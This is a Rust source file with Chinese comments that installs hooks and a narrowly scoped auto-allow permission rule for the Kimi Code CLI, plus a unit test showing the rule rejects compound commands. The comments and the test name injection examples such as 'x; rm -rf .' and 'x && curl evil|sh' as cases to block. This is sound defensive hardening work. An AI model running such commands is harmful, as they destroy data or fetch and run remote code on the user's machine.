//! Kimi Code 官方 agents/skills 文档：现代版目录跟随 KIMI_CODE_HOME，旧 Python 变体未取证不安装。
//! 取证：https://moonshotai.github.io/kimi-code/en/customization/skills.html
//! 取证：https://moonshotai.github.io/kimi-code/en/customization/agents.html
//! 取证：https://moonshotai.github.io/kimi-code/en/customization/hooks.html
use crate::{
    lead_install::{
        waiter_command_prefix, LeadCap, LeadHook, LeadHookFormat, LeadInstallSpec, NativeContinue,
        WaiterShell, MANAGED_MARK, REVIEW,
    },
    variant::Installation,
};
pub(super) static CAP: KimiLead = KimiLead;
pub(super) struct KimiLead;
const SPEC: LeadInstallSpec = LeadInstallSpec {
    provider: "kimi",
    version_family: (2, 5),
    verified: (2, 6, 0),
    skill_rel: "skills/lead/SKILL.md",
    reviewer_rel: "agents/lead-redteam.md",
    hook_rel: "config.toml",
    format: LeadHookFormat::Toml,
    hooks: &[
        LeadHook {
            event: "SessionStart",
            mode: "session",
            timeout: 10,
        },
        LeadHook {
            event: "UserPromptSubmit",
            mode: "session",
            timeout: 10,
        },
        // 写挂起关卡前要求会话里已有等待器（kimi 2.6.0 的 Stop hook 不触发，见 reporter kimi_gate_guard）。
        LeadHook {
            event: "PreToolUse",
            mode: "gate",
            timeout: 10,
        },
        LeadHook {
            event: "PostToolUse",
            mode: "claim",
            timeout: 10,
        },
        LeadHook {
            event: "Stop",
            mode: "stop",
            timeout: 10,
        },
    ],
    limitations: &[
        "lead/auto_continue_unverified",
        "lead/main_agent_identity_unverified",
        "lead/compact_context_unverified",
        "lead/non_lead_io_unverified",
    ],
    powershell: false,
    windows_override: false,
};
/// 后台 Bash 是 `sh -c`（Windows 上 Git Bash），见 [`WaiterShell::PosixDoubleQuoted`]。
const SHELL: WaiterShell = WaiterShell::PosixDoubleQuoted;

/// 把文本当字面量放进 kimi permission 规则（picomatch 4.0.4）。
///
/// 在 kimi 2.6.0 源码 GLOB_LITERAL_SPECIAL（`[\\*?[\]{}()!+@|]`）之外**还要转义引号**：picomatch 把
/// `"…"` 当引用语法、编出的正则里没有引号字符，而命令里有，于是带引号的规则一条都匹配不上
/// （2026-11-13 从 kimi.exe 抽出它自带的 picomatch 4.0.4 实测：旧规则对合法等待命令也是 false，
/// 等待器每次都要用户手点允许）。
fn glob_literal(text: &str) -> String {
    text.chars()
        .flat_map(|c| {
            let special = r#"\*?[]{}()!+@|"'"#.contains(c);
            special
                .then_some('\\')
                .into_iter()
                .chain(std::iter::once(c))
        })
        .collect()
}

/// 会话 id 的通配：只认 `[A-Za-z0-9_-]` 一个以上（与 reporter 等待器的参数校验同一字符集）。
///
/// 不能用 `*`：kimi 对 Bash 规则拿**整条命令串**做 picomatch（2.6.0 resolveExecution →
/// matchesGlobRuleSubject(ruleArgs, args.command)，不拆 `;`/`&&`/`|`），而 `*` 除 `/` 外什么都匹配，
/// `--session x; rm -rf .`、`--session x && curl … | sh` 都会被自动放行（同上实测）。
const SESSION_GLOB: &str = "+([A-Za-z0-9_-])";

/// 放行等待器的 permission 规则：只匹配本机 reporter 的 `lead wait --provider kimi --session <id>`。
fn waiter_rule(reporter: &str) -> String {
    format!(
        "Bash({} --session {SESSION_GLOB})",
        glob_literal(&waiter_command_prefix(SHELL, SPEC.provider, reporter))
    )
}

fn is_waiter_rule(item: &dyn toml_edit::TableLike) -> bool {
    item.get("pattern")
        .and_then(toml_edit::Item::as_str)
        .or_else(|| {
            item.get("pattern")
                .and_then(|i| i.as_value())
                .and_then(|v| v.as_str())
        })
        .is_some_and(|pattern| {
            pattern.starts_with("Bash(")
                && pattern.contains("meowo-reporter")
                && pattern.contains(" lead wait --provider kimi ")
        })
}

impl LeadCap for KimiLead {
    /// 关卡挂起时 TUI 里后台 Bash 跑等待器（PreToolUse 拦下写挂起关卡、给出原样命令）；完成通知让空闲 TUI 自己开新回合
    /// （2.6.0 源码 completeDetached → loop.notify，research-kimi-gemini.md 假模型实测）。
    /// TUI 不在时不续写（leader 2026-11-13「不需要离线」）：答复只保存，用户回到会话说一句话时由 hook 交给模型。
    fn native_continue(&self) -> Option<NativeContinue> {
        Some(NativeContinue::InSessionWaiter { shell: SHELL })
    }
    /// 后台任务完成通知（notify）、PreToolUse 拦截与等待器都只在 2.6.0 查证过；2.5.x 能装 Lead，
    /// 但续跑走手动提示（第一轮做空 M6）。
    fn native_continue_floor(&self) -> Option<(u32, u32, u32)> {
        Some((2, 6, 0))
    }
    fn edit_hook_file(
        &self,
        _inst: &Installation,
        text: &str,
        reporter: &str,
        enabled: bool,
        _saved: Option<&str>,
    ) -> Result<(String, Option<String>), String> {
        let mut doc = text
            .parse::<toml_edit::DocumentMut>()
            .map_err(|_| "lead/settings_invalid")?;
        let desired = if enabled {
            Some(waiter_rule(reporter))
        } else {
            None
        };
        let mut ours = Vec::new();
        if let Some(rules) = doc.get("permission").and_then(|p| p.get("rules")) {
            if let Some(tables) = rules.as_array_of_tables() {
                for table in tables.iter() {
                    if is_waiter_rule(table) {
                        ours.push(
                            table
                                .get("pattern")
                                .and_then(toml_edit::Item::as_str)
                                .map(str::to_owned),
                        );
                    }
                }
            } else if let Some(array) = rules.as_array() {
                for value in array.iter() {
                    match value.as_inline_table() {
                        Some(table) if is_waiter_rule(table) => ours.push(
                            table
                                .get("pattern")
                                .and_then(|v| v.as_str())
                                .map(str::to_owned),
                        ),
                        _ => {}
                    }
                }
            } else {
                return Err("lead/settings_invalid".into());
            }
        }
        // 已经是想要的样子就原样返回：inspect 靠幂等判断已安装，也不打乱用户规则的顺序。
        if ours.len() == usize::from(desired.is_some())
            && ours.first().cloned().flatten() == desired
        {
            return Ok((text.to_owned(), None));
        }
        if !doc.contains_key("permission") {
            if desired.is_none() {
                return Ok((text.to_owned(), None));
            }
            doc["permission"] = toml_edit::table();
        }
        let permission = doc["permission"]
            .as_table_like_mut()
            .ok_or("lead/settings_invalid")?;
        if !permission.contains_key("rules") {
            permission.insert(
                "rules",
                toml_edit::Item::ArrayOfTables(toml_edit::ArrayOfTables::new()),
            );
        }
        let rules = permission.get_mut("rules").ok_or("lead/settings_invalid")?;
        if let Some(tables) = rules.as_array_of_tables_mut() {
            tables.retain(|table| !is_waiter_rule(table));
            if let Some(pattern) = &desired {
                let mut table = toml_edit::Table::new();
                table.insert("decision", toml_edit::value("allow"));
                table.insert("scope", toml_edit::value("user"));
                table.insert("pattern", toml_edit::value(pattern.as_str()));
                table.insert(
                    "reason",
                    toml_edit::value(format!("{MANAGED_MARK}：Lead 关卡等待器")),
                );
                tables.push(table);
            }
        } else if let Some(array) = rules.as_array_mut() {
            array.retain(|value| !value.as_inline_table().is_some_and(|t| is_waiter_rule(t)));
            if let Some(pattern) = &desired {
                let mut table = toml_edit::InlineTable::new();
                table.insert("decision", "allow".into());
                table.insert("scope", "user".into());
                table.insert("pattern", pattern.as_str().into());
                table.insert("reason", format!("{MANAGED_MARK}：Lead 关卡等待器").into());
                array.push(table);
            }
        }
        // 卸载后只剩 Meowo 建的空壳时一并去掉，配置还原成安装前的样子。
        let empty_rules = permission.get("rules").is_some_and(|rules| {
            rules.as_array_of_tables().is_some_and(|t| t.is_empty())
                || rules.as_array().is_some_and(|a| a.is_empty())
        });
        if empty_rules {
            permission.remove("rules");
        }
        if permission.is_empty() {
            doc.remove("permission");
        }
        Ok((doc.to_string(), None))
    }
    fn spec(&self, inst: &Installation) -> Option<&'static LeadInstallSpec> {
        (inst.variant_tag == "modern").then_some(&SPEC)
    }
    fn reviewer(&self) -> String {
        format!(
            "---\nname: lead-redteam\ndescription: Independent adversarial review against the Lead specification.\ntools:\n  - Read\n  - Grep\n  - Glob\n  - Bash\nsubagents: []\n---\n\n{REVIEW}"
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 做空 M8：放行规则不能放进复合命令。kimi 2.6.0 不拆 `;`/`&&`/`|`、拿整条命令做 picomatch，
    /// 所以规则里不能有会吞下这些字符的通配；也不能留裸引号（picomatch 当引用语法吃掉，规则永不命中）。
    /// 对照：kimi.exe 内嵌 picomatch 4.0.4 实测，本规则只命中 `--session session_abc-1`，
    /// `x; rm -rf .`、`x && curl evil|sh`、`x$(id)`、反引号、换行、空格、空串、`a/b` 全部不命中。
    #[test]
    fn waiter_rule_only_admits_a_bare_session_id() {
        for reporter in [
            r"C:\Program Files (x86)\Meowo\meowo-reporter.exe",
            r"C:\Users\o'neil\a+b\[x]\meowo-reporter.exe",
            "/Applications/Meowo.app/Contents/MacOS/meowo-reporter",
        ] {
            let rule = waiter_rule(reporter);
            let args = rule
                .strip_prefix("Bash(")
                .and_then(|r| r.strip_suffix(')'))
                .unwrap();
            let (prefix, session) = args.rsplit_once(" --session ").unwrap();
            assert_eq!(session, SESSION_GLOB, "{rule}");
            // 前缀里每个通配/引号字符都已转义：去掉转义对之后不剩任何特殊字符。
            let mut chars = prefix.chars();
            let mut bare = String::new();
            while let Some(c) = chars.next() {
                if c == '\\' {
                    chars.next();
                } else {
                    bare.push(c);
                }
            }
            assert!(
                !bare.chars().any(|c| r#"*?[]{}()!+@|"'"#.contains(c)),
                "{rule} 前缀里有未转义的特殊字符"
            );
            assert!(is_waiter_rule(&{
                let mut t = toml_edit::Table::new();
                t.insert("pattern", toml_edit::value(rule.as_str()));
                t
            }));
        }
        // 通配只认的字符集与 reporter 等待器的参数校验一致：合法 id 全在里面，shell 元字符一个不在。
        let class = |c: char| c.is_ascii_alphanumeric() || matches!(c, '_' | '-');
        assert!("session_0f3A-b".chars().all(class));
        assert!(!";&|$`'\" \n/<>()".chars().any(class));
    }
}
